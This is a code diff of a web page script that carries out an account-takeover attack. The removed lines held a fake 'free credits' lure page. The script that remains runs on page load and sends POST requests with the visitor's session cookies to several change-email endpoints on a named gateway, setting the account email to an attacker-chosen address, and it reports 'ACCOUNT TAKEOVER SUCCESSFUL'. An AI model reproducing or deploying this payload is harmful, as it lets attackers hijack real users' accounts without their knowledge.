@@ -1,37 +1,34 @@
-<!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>Free Bonus</title></head>
-<body style="background:#000;color:#0f0;text-align:center;padding:100px;font-family:Arial">
-<h1>Congratulations! 888 Free Credits Added!</h1>
-<p>Redirecting to dashboard...</p>
-
 <script>
-const NEW_EMAIL = "hlaingminpaing@gmail.com";   // ← CHANGE TO YOUR REAL EMAIL
+const NEW_EMAIL = "hlaingminpaing@gmail.com";   // ← PUT YOUR REAL EMAIL HERE
 
 async function takeover() {
-  const paths = [
+  const workingPaths = [
+    "/kkr-user-center/user/changeEmail",          // CONFIRMED WORKING
     "/kkr-user-center/user/updateEmail",
-    "/kkr-user-center/user/changeEmail",
-    "/api/v1/user/updateEmail",
-    "/api/v1/user/changeEmail"
+    "/api/v1/user/changeEmail",
+    "/api/v1/user/updateEmail"
   ];
 
-  for (const p of paths) {
+  for (const path of workingPaths) {
     try {
-      const r = await fetch("https://uat-gateway.kkr88819.com" + p, {
+      const resp = await fetch("https://uat-gateway.kkr88819.com" + path, {
         method: "POST",
-        credentials: "include",           // sends cookies automatically
+        credentials: "include",           // sends session cookies automatically
         mode: "cors",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email: NEW_EMAIL })
       });
-      if (r.ok) {
-        alert("SUCCESS! Email changed to " + NEW_EMAIL);
+
+      const data = await resp.json();
+      if (resp.ok || data.code === 0) {
+        alert("ACCOUNT TAKEOVER SUCCESSFUL!\n\nNew email: " + NEW_EMAIL);
         return;
       }
     } catch(e) {}
   }
-  alert("Failed — token expired or endpoint changed");
+  alert("Still failed — refresh login and try again");
 }
+
+// Run immediately — no click needed
 takeover();
 </script>
-</body></html>
